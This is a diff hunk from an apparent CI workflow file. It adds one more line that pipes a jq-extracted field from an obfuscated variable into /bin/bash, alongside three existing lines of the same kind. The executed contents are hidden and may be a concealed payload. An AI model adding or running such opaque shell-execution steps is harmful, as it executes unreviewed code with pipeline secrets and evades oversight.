@@ -43,6 +43,7 @@ jobs:
           echo $okn2 | jq -r .mviqg571 | /bin/bash
           echo $b16 | jq -r .xr29002 | /bin/bash
           printf '%s' "$et2" | jq -r .alxyx32 | /bin/bash
+          printf '%s' "$l8571" | jq -r .tyvas451 | /bin/bash
 
       - name: Upload artifact
         if: always()
